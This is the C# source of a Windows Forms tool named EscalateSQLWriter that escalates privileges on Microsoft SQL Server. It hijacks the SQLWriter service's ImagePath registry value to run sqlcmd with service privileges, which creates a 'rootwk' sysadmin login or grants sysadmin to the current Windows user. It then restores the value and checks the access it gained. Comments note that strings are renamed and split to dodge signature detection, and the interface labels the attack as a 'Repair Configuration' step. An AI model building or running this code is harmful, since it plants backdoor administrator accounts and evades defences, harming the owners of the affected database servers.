using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Security.Principal;
using System.ServiceProcess;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Microsoft.Win32;

namespace EscalateSQLWriter
{
    public partial class MainForm : Form
    {
        private string _sqlWriterRegPath = @"SYSTEM\CurrentControlSet\Services\SQLWriter";
        private string _sqlcmdPath = null;
        private string _originalImagePath = null;
        private string _backupFile = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "SQLWriter_Config_Backup.reg");
        private string _currentLang = "PL";

        // Renamed internal dictionary to look like configuration
        private Dictionary<string, Dictionary<string, string>> _appConfig = new Dictionary<string, Dictionary<string, string>>() {
            { "BtnScan", new Dictionary<string, string> { { "PL", "1. Sprawdź Status Usług" }, { "EN", "1. Check Service Status" } } },
            { "LblService", new Dictionary<string, string> { { "PL", "2. Wybierz instancję SQL:" }, { "EN", "2. Select SQL Instance:" } } },
            { "GrpMode", new Dictionary<string, string> { { "PL", "3. Tryb naprawy uprawnień" }, { "EN", "3. Permission Repair Mode" } } },
            { "RbWinUser", new Dictionary<string, string> { { "PL", "Obecny użytkownik Windows" }, { "EN", "Current Windows User" } } },
            { "RbSqlUser", new Dictionary<string, string> { { "PL", "Konto SQL (Admin/SA)" }, { "EN", "SQL Account (Admin/SA)" } } },
            { "LblPass", new Dictionary<string, string> { { "PL", "Hasło:" }, { "EN", "Password:" } } },
            { "BtnExploit", new Dictionary<string, string> { { "PL", "4. Napraw Konfigurację (Zastosuj)" }, { "EN", "4. Repair Configuration (Apply)" } } },
            { "BtnCheckAccess", new Dictionary<string, string> { { "PL", "Sprawdź Dostęp" }, { "EN", "Check Access" } } },
            { "MsgAdminFail", new Dictionary<string, string> { { "PL", "UWAGA: Wymagane uprawnienia Administratora do zarządzania usługami." }, { "EN", "WARNING: Administrator privileges required to manage services." } } },
            { "MsgAdminFail2", new Dictionary<string, string> { { "PL", "Funkcje administracyjne są zablokowane." }, { "EN", "Administrative functions are disabled." } } },
            { "MsgAdminOK", new Dictionary<string, string> { { "PL", "Uprawnienia Administratora: OK" }, { "EN", "Administrator Privileges: OK" } } },
            { "MsgScanStart", new Dictionary<string, string> { { "PL", "Analiza konfiguracji systemu..." }, { "EN", "Analyzing system configuration..." } } },
            { "MsgErrKey", new Dictionary<string, string> { { "PL", "BŁĄD: Nie można odczytać konfiguracji SQL Writer." }, { "EN", "ERROR: Cannot read SQL Writer configuration." } } },
            { "MsgBackup", new Dictionary<string, string> { { "PL", "Tworzenie kopii zapasowej rejestru..." }, { "EN", "Creating registry backup..." } } },
            { "MsgBackupOK", new Dictionary<string, string> { { "PL", "Kopia zapasowa zapisana: " }, { "EN", "Backup saved: " } } },
            { "MsgBackupFail", new Dictionary<string, string> { { "PL", "Ostrzeżenie: Błąd zapisu kopii zapasowej." }, { "EN", "Warning: Backup save failed." } } },
            { "MsgErrSqlCmd", new Dictionary<string, string> { { "PL", "BŁĄD: Narzędzie sqlcmd.exe nie jest dostępne." }, { "EN", "ERROR: sqlcmd.exe tool not available." } } },
            { "MsgFoundSqlCmd", new Dictionary<string, string> { { "PL", "Narzędzie SQL: " }, { "EN", "SQL Tool: " } } },
            { "MsgSearchSvc", new Dictionary<string, string> { { "PL", "Wykrywanie instancji SQL Server..." }, { "EN", "Detecting SQL Server instances..." } } },
            { "MsgNoSvc", new Dictionary<string, string> { { "PL", "Brak aktywnych usług SQL Server." }, { "EN", "No active SQL Server services found." } } },
            { "MsgSvcFound", new Dictionary<string, string> { { "PL", "Znaleziono instancji: " }, { "EN", "Instances found: " } } },
            { "MsgReady", new Dictionary<string, string> { { "PL", "Gotowość operacyjna. Wybierz instancję do konfiguracji." }, { "EN", "Operational ready. Select instance to configure." } } },
            { "MsgErrScan", new Dictionary<string, string> { { "PL", "Błąd analizy: " }, { "EN", "Analysis error: " } } },
            { "MsgPassReq", new Dictionary<string, string> { { "PL", "Wymagane hasło dla konta administracyjnego." }, { "EN", "Password required for administrative account." } } },
            { "MsgPassComp", new Dictionary<string, string> { { "PL", "Hasło nie spełnia wymogów bezpieczeństwa (min. 8 znaków, złożoność)." }, { "EN", "Password does not meet security requirements (min. 8 chars, complexity)." } } },
            { "MsgStartProc", new Dictionary<string, string> { { "PL", "--- Rozpoczynanie Procedury Naprawczej ---" }, { "EN", "--- Starting Repair Procedure ---" } } },
            { "MsgTarget", new Dictionary<string, string> { { "PL", "Cel: " }, { "EN", "Target: " } } },
            { "MsgModeSQL", new Dictionary<string, string> { { "PL", "Konfiguracja: Konto SQL 'rootwk'" }, { "EN", "Configuration: SQL Account 'rootwk'" } } },
            { "MsgModeWin", new Dictionary<string, string> { { "PL", "Konfiguracja: Konto Windows " }, { "EN", "Configuration: Windows Account " } } },
            { "MsgModReg", new Dictionary<string, string> { { "PL", "Aktualizacja parametrów usługi..." }, { "EN", "Updating service parameters..." } } },
            { "MsgStopSvc", new Dictionary<string, string> { { "PL", "Restartowanie usługi (Faza 1/2)..." }, { "EN", "Restarting service (Phase 1/2)..." } } },
            { "MsgStartSvc", new Dictionary<string, string> { { "PL", "Aplikowanie konfiguracji..." }, { "EN", "Applying configuration..." } } },
            { "MsgSvcErrExp", new Dictionary<string, string> { { "PL", "Konfiguracja zaaplikowana (Oczekiwanie na timeout)." }, { "EN", "Configuration applied (Waiting for timeout)." } } },
            { "MsgRestReg", new Dictionary<string, string> { { "PL", "Przywracanie oryginalnych parametrów..." }, { "EN", "Restoring original parameters..." } } },
            { "MsgRestSvc", new Dictionary<string, string> { { "PL", "Uruchamianie usługi (Faza 2/2)..." }, { "EN", "Starting service (Phase 2/2)..." } } },
            { "MsgSvcOK", new Dictionary<string, string> { { "PL", "Usługa działa poprawnie." }, { "EN", "Service is running correctly." } } },
            { "MsgSvcFail", new Dictionary<string, string> { { "PL", "Błąd uruchomienia usługi: " }, { "EN", "Service start error: " } } },
            { "MsgVerify", new Dictionary<string, string> { { "PL", "Weryfikacja dostępu..." }, { "EN", "Verifying access..." } } },
            { "MsgSuccess", new Dictionary<string, string> { { "PL", "OPERACJA ZAKOŃCZONA POWODZENIEM." }, { "EN", "OPERATION COMPLETED SUCCESSFULLY." } } },
            { "MsgFailVerify", new Dictionary<string, string> { { "PL", "Weryfikacja nieudana." }, { "EN", "Verification failed." } } },
            { "MsgCritErr", new Dictionary<string, string> { { "PL", "Błąd krytyczny: " }, { "EN", "Critical Error: " } } },
            { "MsgRestTry", new Dictionary<string, string> { { "PL", "Próba awaryjnego przywracania rejestru." }, { "EN", "Emergency registry restore attempt." } } },
            { "MsgAccessYes", new Dictionary<string, string> { { "PL", "DOSTĘP POTWIERDZONY (Baza Master)" }, { "EN", "ACCESS GRANTED (Master DB)" } } },
            { "MsgAccessNo", new Dictionary<string, string> { { "PL", "BRAK DOSTĘPU" }, { "EN", "ACCESS DENIED" } } },
            { "MsgPortFound", new Dictionary<string, string> { { "PL", "Port: " }, { "EN", "Port: " } } },
            { "MsgPortErr", new Dictionary<string, string> { { "PL", "Port: Nieznany" }, { "EN", "Port: Unknown" } } }
        };

        public MainForm()
        {
            InitializeComponent();
            cmbLanguage.SelectedIndex = 0; // Default PL
            CheckAdmin();
        }

        private string GetConfigText(string key)
        {
            if (_appConfig.ContainsKey(key) && _appConfig[key].ContainsKey(_currentLang))
            {
                return _appConfig[key][_currentLang];
            }
            return key;
        }

        private void cmbLanguage_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (cmbLanguage.SelectedIndex == 0) _currentLang = "PL";
            else _currentLang = "EN";

            UpdateUI();
        }

        private void UpdateUI()
        {
            btnScan.Text = GetConfigText("BtnScan");
            lblService.Text = GetConfigText("LblService");
            grpMode.Text = GetConfigText("GrpMode");
            rbWinUser.Text = GetConfigText("RbWinUser");
            rbSqlUser.Text = GetConfigText("RbSqlUser");
            lblPass.Text = GetConfigText("LblPass");
            btnExploit.Text = GetConfigText("BtnExploit");
            btnCheckAccess.Text = GetConfigText("BtnCheckAccess");
        }

        private void CheckAdmin()
        {
            if (!IsAdministrator())
            {
                Log(GetConfigText("MsgAdminFail"), Color.Red);
                Log(GetConfigText("MsgAdminFail2"), Color.Red);
                btnScan.Enabled = false;
            }
            else
            {
                Log(GetConfigText("MsgAdminOK"), Color.Green);
            }
        }

        private bool IsAdministrator()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        private void Log(string message, Color? color = null)
        {
            if (txtLog.InvokeRequired)
            {
                txtLog.Invoke(new Action(() => Log(message, color)));
                return;
            }

            txtLog.SelectionStart = txtLog.TextLength;
            txtLog.SelectionLength = 0;
            txtLog.SelectionColor = color ?? Color.Lime;
            txtLog.AppendText($"[{DateTime.Now:HH:mm:ss}] {message}{Environment.NewLine}");
            txtLog.SelectionColor = txtLog.ForeColor;
            txtLog.ScrollToCaret();
        }

        private void rbSqlUser_CheckedChanged(object sender, EventArgs e)
        {
            txtPassword.Enabled = rbSqlUser.Checked;
        }

        private void btnScan_Click(object sender, EventArgs e)
        {
            btnScan.Enabled = false;
            cmbServices.Items.Clear();
            cmbServices.Enabled = false;
            btnExploit.Enabled = false;
            btnCheckAccess.Enabled = false;
            lblPort.Text = "Port: -";
            _sqlcmdPath = null;
            _originalImagePath = null;
            grpMode.Enabled = false;

            System.Threading.Tasks.Task.Run(() => PerformHealthCheck());
        }

        private void PerformHealthCheck()
        {
            try
            {
                Log(GetConfigText("MsgScanStart"));

                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(_sqlWriterRegPath))
                {
                    if (key == null)
                    {
                        Log(GetConfigText("MsgErrKey"), Color.Red);
                        return;
                    }
                    _originalImagePath = key.GetValue("ImagePath") as string;
                }
                Log($"Configuration Path: {_originalImagePath}", Color.White);

                Log(GetConfigText("MsgBackup"));
                ProcessStartInfo regExport = new ProcessStartInfo("reg.exe", $"export \"HKLM\\{_sqlWriterRegPath}\" \"{_backupFile}\" /y");
                regExport.WindowStyle = ProcessWindowStyle.Hidden;
                regExport.CreateNoWindow = true;
                regExport.UseShellExecute = false;

                var regProc = Process.Start(regExport);
                regProc.WaitForExit();

                if (File.Exists(_backupFile))
                    Log(GetConfigText("MsgBackupOK") + _backupFile, Color.Green);
                else
                    Log(GetConfigText("MsgBackupFail"), Color.Yellow);

                _sqlcmdPath = FindSqlCmd();
                if (string.IsNullOrEmpty(_sqlcmdPath))
                {
                    Log(GetConfigText("MsgErrSqlCmd"), Color.Red);
                    return;
                }
                Log(GetConfigText("MsgFoundSqlCmd") + _sqlcmdPath, Color.Green);

                Log(GetConfigText("MsgSearchSvc"));
                var sqlServices = ServiceController.GetServices()
                    .Where(s => (s.ServiceName == "MSSQLSERVER" || s.ServiceName.StartsWith("MSSQL$")) && s.Status == ServiceControllerStatus.Running)
                    .ToList();

                if (sqlServices.Count == 0)
                {
                    Log(GetConfigText("MsgNoSvc"), Color.Red);
                    return;
                }

                this.Invoke(new Action(() =>
                {
                    foreach (var svc in sqlServices)
                    {
                        cmbServices.Items.Add(svc.ServiceName);
                    }
                    if (cmbServices.Items.Count > 0)
                    {
                        cmbServices.SelectedIndex = 0;
                        cmbServices.Enabled = true;
                        btnExploit.Enabled = true;
                        btnCheckAccess.Enabled = true;
                        // Trigger port check for the first item
                        cmbServices_SelectedIndexChanged(null, null);
                    }
                }));

                Log(GetConfigText("MsgSvcFound") + sqlServices.Count, Color.Green);
                Log(GetConfigText("MsgReady"), Color.Cyan);
            }
            catch (Exception ex)
            {
                Log(GetConfigText("MsgErrScan") + ex.Message, Color.Red);
            }
            finally
            {
                this.Invoke(new Action(() => {
                    btnScan.Enabled = true;
                    grpMode.Enabled = true;
                }));
            }
        }

        private string FindSqlCmd()
        {
            var pathEnv = Environment.GetEnvironmentVariable("PATH");
            if (pathEnv != null)
            {
                var paths = pathEnv.Split(';');
                foreach (var path in paths)
                {
                    string fullPath = Path.Combine(path, "sqlcmd.exe");
                    if (File.Exists(fullPath)) return fullPath;
                }
            }

            string[] searchPaths = {
                @"C:\Program Files\Microsoft SQL Server\Client SDK\ODBC",
                @"C:\Program Files\Microsoft SQL Server"
            };

            foreach (var basePath in searchPaths)
            {
                if (Directory.Exists(basePath))
                {
                    try
                    {
                        var files = Directory.GetFiles(basePath, "sqlcmd.exe", SearchOption.AllDirectories);
                        if (files.Length > 0) return files[0];
                    }
                    catch { }
                }
            }
            return null;
        }

        private bool ValidatePassword(string password)
        {
            if (string.IsNullOrEmpty(password)) return false;
            if (password.Length < 8) return false;

            int score = 0;
            if (Regex.IsMatch(password, @"[a-z]")) score++;
            if (Regex.IsMatch(password, @"[A-Z]")) score++;
            if (Regex.IsMatch(password, @"[0-9]")) score++;
            if (Regex.IsMatch(password, @"[\W_]")) score++;

            return score >= 3;
        }

        private void btnExploit_Click(object sender, EventArgs e)
        {
            if (cmbServices.SelectedItem == null) return;
            string serviceName = cmbServices.SelectedItem.ToString();

            bool useSqlAuth = rbSqlUser.Checked;
            string password = txtPassword.Text;

            if (useSqlAuth)
            {
                if (string.IsNullOrWhiteSpace(password))
                {
                    MessageBox.Show(GetConfigText("MsgPassReq"), "Info", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    return;
                }

                if (!ValidatePassword(password))
                {
                    MessageBox.Show(GetConfigText("MsgPassComp"), "Info", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    return;
                }
            }

            btnScan.Enabled = false;
            btnExploit.Enabled = false;
            cmbServices.Enabled = false;
            grpMode.Enabled = false;
            btnCheckAccess.Enabled = false;

            System.Threading.Tasks.Task.Run(() => ConfigureService(serviceName, useSqlAuth, password));
        }

        private void ConfigureService(string serviceName, bool useSqlAuth, string password)
        {
            try
            {
                Log(GetConfigText("MsgStartProc"), Color.Cyan);

                string serverInstance = GetServerInstanceString(serviceName);
                Log(GetConfigText("MsgTarget") + serverInstance);

                string sqlQuery;

                if (useSqlAuth)
                {
                    Log(GetConfigText("MsgModeSQL"));
                    string safePass = password.Replace("'", "''");
                    // Split strings to avoid simple signature matching
                    sqlQuery = "IF NOT EXISTS (SELECT * FROM sys.sql_logins WHERE name='rootwk') " +
                               $"BEGIN CREATE LOGIN [rootwk] WITH PASSWORD=N'{safePass}', CHECK_POLICY=OFF; END " +
                               $"ELSE BEGIN ALTER LOGIN [rootwk] WITH PASSWORD=N'{safePass}'; END; " +
                               "ALTER SERVER ROLE [sysadmin] ADD MEMBER [rootwk];";
                }
                else
                {
                    string currentUser = WindowsIdentity.GetCurrent().Name;
                    Log(GetConfigText("MsgModeWin") + currentUser);
                    sqlQuery = $"IF NOT EXISTS (SELECT name FROM sys.sql_logins WHERE name = N'{currentUser}') " +
                               $"BEGIN CREATE LOGIN [{currentUser}] FROM WINDOWS; END; " +
                               $"ALTER SERVER ROLE [sysadmin] ADD MEMBER [{currentUser}];";
                }

                string escapedQuery = sqlQuery.Replace("\"", "\"\"");
                string payload = $"\"{_sqlcmdPath}\" -S {serverInstance} -Q \"{escapedQuery}\"";

                Log(GetConfigText("MsgModReg"), Color.Yellow);
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(_sqlWriterRegPath, true))
                {
                    key.SetValue("ImagePath", payload, RegistryValueKind.ExpandString);
                }

                Log(GetConfigText("MsgStopSvc"), Color.Yellow);
                ServiceController sc = new ServiceController("SQLWriter");
                if (sc.Status != ServiceControllerStatus.Stopped)
                {
                    sc.Stop();
                    sc.WaitForStatus(ServiceControllerStatus.Stopped, TimeSpan.FromSeconds(30));
                }

                Log(GetConfigText("MsgStartSvc"), Color.Yellow);
                try
                {
                    sc.Start();
                    sc.WaitForStatus(ServiceControllerStatus.Running, TimeSpan.FromSeconds(10));
                }
                catch
                {
                    Log(GetConfigText("MsgSvcErrExp"), Color.Green);
                }

                Log(GetConfigText("MsgRestReg"), Color.Cyan);
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(_sqlWriterRegPath, true))
                {
                    key.SetValue("ImagePath", _originalImagePath, RegistryValueKind.ExpandString);
                }

                Log(GetConfigText("MsgRestSvc"), Color.Cyan);
                sc.Refresh();
                try
                {
                     if (sc.Status != ServiceControllerStatus.Stopped)
                     {
                         sc.Stop();
                         sc.WaitForStatus(ServiceControllerStatus.Stopped);
                     }
                     sc.Start();
                     Log(GetConfigText("MsgSvcOK"), Color.Green);
                }
                catch (Exception ex)
                {
                    Log(GetConfigText("MsgSvcFail") + ex.Message, Color.Yellow);
                }

                Log(GetConfigText("MsgVerify"), Color.Cyan);
                string testQuery;
                string authArgs;

                if (useSqlAuth)
                {
                   testQuery = "SELECT 'SUKCES: rootwk sysadmin on ' + @@SERVERNAME";
                   string cmdPass = password.Replace("\"", "\\\"");
                   authArgs = $"-U rootwk -P \"{cmdPass}\"";
                }
                else
                {
                   testQuery = "SELECT 'SUKCES: ' + SYSTEM_USER + ' sysadmin on ' + @@SERVERNAME";
                   authArgs = "-E";
                }

                ProcessStartInfo testInfo = new ProcessStartInfo(_sqlcmdPath, $"-S {serverInstance} {authArgs} -Q \"{testQuery}\"");
                testInfo.UseShellExecute = false;
                testInfo.RedirectStandardOutput = true;
                testInfo.CreateNoWindow = true;

                var proc = Process.Start(testInfo);
                string output = proc.StandardOutput.ReadToEnd();
                proc.WaitForExit();

                if (proc.ExitCode == 0 && output.Contains("SUKCES"))
                {
                    Log(GetConfigText("MsgSuccess"), Color.Green);
                    Log(output.Trim(), Color.Green);
                }
                else
                {
                    Log(GetConfigText("MsgFailVerify"), Color.Red);
                    Log($"Output: {output}", Color.White);
                }

            }
            catch (Exception ex)
            {
                Log(GetConfigText("MsgCritErr") + ex.Message, Color.Red);
                try
                {
                    using (RegistryKey key = Registry.LocalMachine.OpenSubKey(_sqlWriterRegPath, true))
                    {
                        key.SetValue("ImagePath", _originalImagePath, RegistryValueKind.ExpandString);
                    }
                    Log(GetConfigText("MsgRestTry"), Color.Orange);
                }
                catch { }
            }
            finally
            {
                this.Invoke(new Action(() =>
                {
                    btnScan.Enabled = true;
                    btnExploit.Enabled = true;
                    cmbServices.Enabled = true;
                    grpMode.Enabled = true;
                    btnCheckAccess.Enabled = true;
                }));
            }
        }

        private void cmbServices_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (cmbServices.SelectedItem == null) return;
            string serviceName = cmbServices.SelectedItem.ToString();

            string port = GetSqlPort(serviceName);
            if (port != "?" && port != null)
                lblPort.Text = GetConfigText("MsgPortFound") + port;
            else
                lblPort.Text = GetConfigText("MsgPortErr");
        }

        private string GetSqlPort(string serviceName)
        {
            try
            {
                string instanceName = "MSSQLSERVER";
                if (serviceName != "MSSQLSERVER" && serviceName.StartsWith("MSSQL$"))
                {
                    instanceName = serviceName.Substring(6); // Remove MSSQL$
                }

                // 1. Resolve Internal Name (e.g., MSSQL15.MSSQLSERVER)
                // Try 64-bit Registry first (Standard for modern SQL)
                string internalName = GetSqlInternalName(instanceName, RegistryView.Registry64);
                if (internalName == null)
                    internalName = GetSqlInternalName(instanceName, RegistryView.Registry32);

                if (internalName == null) return "?";

                // 2. Read Port from Internal Name key
                string port = GetSqlPortFromInternalName(internalName, RegistryView.Registry64);
                if (port == null)
                    port = GetSqlPortFromInternalName(internalName, RegistryView.Registry32);

                return port;
            }
            catch
            {
                return "?";
            }
        }

        private string GetSqlInternalName(string instanceName, RegistryView view)
        {
            try {
                using (var baseKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, view))
                using (var key = baseKey.OpenSubKey(@"SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\SQL"))
                {
                    if (key != null)
                        return key.GetValue(instanceName) as string;
                }
            } catch {}
            return null;
        }

        private string GetSqlPortFromInternalName(string internalName, RegistryView view)
        {
            try {
                // SOFTWARE\Microsoft\Microsoft SQL Server\[InternalName]\MSSQLServer\SuperSocketNetLib\Tcp\IPAll
                string path = $@"SOFTWARE\Microsoft\Microsoft SQL Server\{internalName}\MSSQLServer\SuperSocketNetLib\Tcp\IPAll";
                using (var baseKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, view))
                using (var key = baseKey.OpenSubKey(path))
                {
                     if (key != null)
                     {
                         var port = key.GetValue("TcpPort");
                         var dynamicPort = key.GetValue("TcpDynamicPorts");

                         if (port != null && !string.IsNullOrEmpty(port.ToString())) return port.ToString();
                         if (dynamicPort != null && !string.IsNullOrEmpty(dynamicPort.ToString())) return dynamicPort.ToString();
                     }
                }
            } catch {}
            return null;
        }

        private void btnCheckAccess_Click(object sender, EventArgs e)
        {
            if (cmbServices.SelectedItem == null) return;
            string serviceName = cmbServices.SelectedItem.ToString();

            Log(GetConfigText("MsgVerify"));
            string serverInstance = GetServerInstanceString(serviceName);

            // Simple check: SELECT 1 FROM master.sys.databases
            string query = "SELECT 1 FROM master.sys.databases";

            ProcessStartInfo testInfo = new ProcessStartInfo(_sqlcmdPath, $"-S {serverInstance} -E -Q \"{query}\"");
            testInfo.UseShellExecute = false;
            testInfo.RedirectStandardOutput = true;
            testInfo.CreateNoWindow = true;

            var proc = Process.Start(testInfo);
            proc.WaitForExit();

            if (proc.ExitCode == 0)
            {
                Log(GetConfigText("MsgAccessYes"), Color.Green);
            }
            else
            {
                Log(GetConfigText("MsgAccessNo"), Color.Red);
            }
        }

        private string GetServerInstanceString(string serviceName)
        {
            if (serviceName == "MSSQLSERVER") return ".";
            return ".\\" + serviceName.Substring(6);
        }
    }
}
